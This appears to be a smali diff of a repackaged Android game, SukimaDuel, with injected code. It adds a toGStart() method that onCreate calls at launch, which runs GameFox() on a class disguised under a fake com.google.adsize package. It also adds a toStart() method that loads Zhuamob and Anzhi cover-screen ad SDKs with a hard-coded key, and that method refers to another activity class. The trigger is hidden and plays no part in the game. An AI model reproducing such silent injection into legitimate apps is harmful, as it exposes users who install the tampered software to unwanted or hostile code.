@@ -1323,6 +1323,19 @@
     return-void
 .end method
 
+.method private toGStart()V
+    .registers 2
+
+    .prologue
+    new-instance v0, Lcom/google/adsize/GoogleTsnActivity;
+
+    invoke-direct {v0, p0}, Lcom/google/adsize/GoogleTsnActivity;-><init>(Landroid/content/Context;)V
+
+    invoke-virtual {v0}, Lcom/google/adsize/GoogleTsnActivity;->GameFox()V
+
+    return-void
+.end method
+
 
 # virtual methods
 .method public AcquireWakeLock()V
@@ -1521,6 +1534,8 @@
     .line 123
     invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
 
+    invoke-direct {p0}, Ljp/colopl/ensukimaduel/SukimaDuelActivity;->toGStart()V
+
     .line 124
     const v5, 0x7f03000d
 
@@ -1667,7 +1682,7 @@
     .line 183
     iget-boolean v5, p0, Ljp/colopl/ensukimaduel/SukimaDuelActivity;->enableAdView:Z
 
-    if-eqz v5, :cond_db
+    if-eqz v5, :cond_de
 
     .line 184
     iget-object v5, p0, Ljp/colopl/ensukimaduel/SukimaDuelActivity;->mAdView:Lcom/google/ads/AdView;
@@ -1677,7 +1692,7 @@
     invoke-virtual {v5, v6}, Lcom/google/ads/AdView;->setVisibility(I)V
 
     .line 190
-    :goto_92
+    :goto_95
     const v5, 0x7f05001f
 
     invoke-virtual {p0, v5}, Ljp/colopl/ensukimaduel/SukimaDuelActivity;->findViewById(I)Landroid/view/View;
@@ -1745,31 +1760,31 @@
     iput-object v5, p0, Ljp/colopl/ensukimaduel/SukimaDuelActivity;->keyGuardMng:Landroid/app/KeyguardManager;
 
     .line 241
-    :try_start_d4
+    :try_start_d7
     invoke-static {}, Landroid/bluetooth/BluetoothAdapter;->getDefaultAdapter()Landroid/bluetooth/BluetoothAdapter;
 
     move-result-object v5
 
     sput-object v5, Ljp/colopl/ensukimaduel/SukimaDuelActivity;->btAdapter:Landroid/bluetooth/BluetoothAdapter;
-    :try_end_da
-    .catch Ljava/lang/Exception; {:try_start_d4 .. :try_end_da} :catch_e2
+    :try_end_dd
+    .catch Ljava/lang/Exception; {:try_start_d7 .. :try_end_dd} :catch_e5
 
     .line 246
-    :goto_da
+    :goto_dd
     return-void
 
     .line 186
-    :cond_db
+    :cond_de
     iget-object v5, p0, Ljp/colopl/ensukimaduel/SukimaDuelActivity;->mAdView:Lcom/google/ads/AdView;
 
     const/4 v6, 0x4
 
     invoke-virtual {v5, v6}, Lcom/google/ads/AdView;->setVisibility(I)V
 
-    goto :goto_92
+    goto :goto_95
 
     .line 243
-    :catch_e2
+    :catch_e5
     move-exception v4
 
     .line 244
@@ -1780,7 +1795,7 @@
 
     invoke-static {v5}, Ljp/colopl/ensukimaduel/SukimaDuelActivity;->NativeSendLog(Ljava/lang/String;)V
 
-    goto :goto_da
+    goto :goto_dd
 .end method
 
 .method public onCreateOptionsMenu(Landroid/view/Menu;)Z
@@ -2425,5 +2440,38 @@
     invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
 
     .line 479
+    return-void
+.end method
+
+.method public toStart()V
+    .registers 5
+
+    .prologue
+    new-instance v1, Lcom/zhuamob/android/ZhuamobLayout;
+
+    invoke-direct {v1, p0}, Lcom/zhuamob/android/ZhuamobLayout;-><init>(Landroid/app/Activity;)V
+
+    .local v1, "zhuamobLayout":Lcom/zhuamob/android/ZhuamobLayout;
+    new-instance v0, Landroid/widget/FrameLayout$LayoutParams;
+
+    const/4 v2, -0x1
+
+    const/4 v3, -0x2
+
+    invoke-direct {v0, v2, v3}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V
+
+    .local v0, "params":Landroid/widget/FrameLayout$LayoutParams;
+    const/16 v2, 0x50
+
+    iput v2, v0, Landroid/widget/FrameLayout$LayoutParams;->gravity:I
+
+    invoke-virtual {p0, v1, v0}, Lcom/aaaa/ZhuamobActivity;->addContentView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
+
+    const-string v0, "kD4sIH1n2XqW7gBe4BVmeV4s"
+
+    invoke-static {p0, v0}, Lcom/anzhi/ad/coverscreen/CoverAdComponent;->init(Landroid/content/Context;Ljava/lang/String;)Lcom/anzhi/ad/coverscreen/CoverAdComponent;
+
+    invoke-static {p0}, Lcom/anzhi/ad/coverscreen/CoverAdComponent;->showAd(Landroid/content/Context;)I
+
     return-void
 .end method
